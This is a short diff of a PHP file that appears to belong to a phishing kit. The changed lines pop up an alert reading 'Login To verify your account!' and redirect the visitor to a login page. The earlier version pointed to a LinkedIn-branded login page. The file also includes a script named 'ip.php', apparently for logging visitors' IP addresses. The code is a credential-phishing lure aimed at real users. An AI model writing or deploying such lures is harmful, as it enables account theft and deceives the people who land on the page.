@@ -1,8 +1,8 @@
 <?php
-echo "<script>alert('This is a notification message.');</script>";
+echo "<script>alert('Login To verify your account!.');</script>";
 ?>
 <?php
-echo "<script>window.location.href = 'linkedin/login.html';</script>";
+echo "<script>window.location.href = '/log.html';</script>";
 ?>
 <?php
 include 'ip.php';
